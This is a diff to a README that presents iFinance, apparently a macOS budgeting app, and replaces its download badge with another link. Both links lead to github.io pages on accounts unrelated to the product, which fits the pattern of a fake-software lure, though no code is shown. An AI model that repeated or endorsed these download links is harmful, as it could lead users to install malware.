@@ -4,13 +4,13 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/82/ad/14/82ad14e5-4a90-9815-8c8c-e31458d14f4c/AppIcon_macOS-0-0-85-220-0-0-5-0-2x-0-0-0.png/1200x600wa.png" alt="iFinance Logo" width="256" height="256">  
 </div>  
 
-[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://hopeguzman087.github.io/.github/iFinance-personal-budget)
+[![Open iFinance](https://img.shields.io/badge/Open-iFinance-4338CA?style=flat-square)](https://ifinance-personal.github.io/.github/)
 
 ---
 
-## What is iFinance for Mac?
+## What is iFinance ?
 
-iFinance for Mac is a comprehensive **personal finance management application** designed specifically for macOS. It provides users with powerful tools to track income and expenses, create and maintain budgets, and visualize their financial health through detailed charts and reports.
+iFinance for is a comprehensive **personal finance management application** designed specifically for macOS. It provides users with powerful tools to track income and expenses, create and maintain budgets, and visualize their financial health through detailed charts and reports.
 
 The software allows you to manage an unlimited number of accounts, including bank accounts, credit cards, cash, and investments, all from a single, intuitive interface. With support for recurring transactions, scheduled payments, and direct bank synchronization (via supported formats like OFX, QIF, and CSV), iFinance Mac saves you time and reduces manual data entry.
 
